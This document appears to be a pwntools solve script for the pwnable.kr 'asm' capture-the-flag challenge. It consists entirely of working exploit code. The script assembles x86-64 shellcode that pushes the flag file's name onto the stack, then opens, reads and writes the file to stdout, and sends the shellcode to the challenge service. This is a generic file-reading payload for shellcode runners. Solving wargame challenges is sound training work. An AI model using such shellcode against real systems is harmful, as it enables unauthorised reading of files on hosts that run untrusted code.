from pwn import *
from binascii import hexlify

context.binary = elf = ELF("./asm")
context.terminal = ('kgx', '-e')


if args.REMOTE:
    r = remote("localhost", 9026)
elif args.GDB:
    r = gdb.debug("./asm", '''
                  b *main+323
                  c
                ''')
else:
    r = process("./asm")

FLAG_FILE_NAME = "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"

def push_string(blocks):
    payload = "push 0x0;\n"
    for i in range(len(blocks)):
        payload += f"mov rbx, 0x{blocks[i]};\n"
        payload += "push rbx;\n"
    return payload

def to_payload(s: str) -> list:
    tmp = (s[::-1].encode() + ((8-len(s))%8)*b'\x00')
    x = hexlify(tmp)
    blocks = []
    for i in range(len(x) // 16):
        blocks.append(x[16*i:16*(i+1)].decode())
    return blocks

print("Decoded stub:")
print(disasm(b"\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff") + "\n")

payload = asm( f'sub rsp, {len(FLAG_FILE_NAME) + len(FLAG_FILE_NAME) % 8};' + \
                push_string(to_payload(FLAG_FILE_NAME)) + \
              '''
                lea rdi, [rsp+1];
                mov rax, 0x2
                mov rsi, 0x0
                mov rdx, 0x0
                syscall

                mov rdi, rax;
                mov rax, 0x0;
                lea rsi, [rsp];
                mov rdx, 0x100;
                syscall

                mov rax, 0x1;
                mov rdi, 0x1;
                lea rsi, [rsp];
                mov rdx, 0x100
                syscall
              ''')

print("Payload:")
print(disasm(payload) + '\n')

r.sendlineafter(b'shellcode: ', payload)
r.interactive()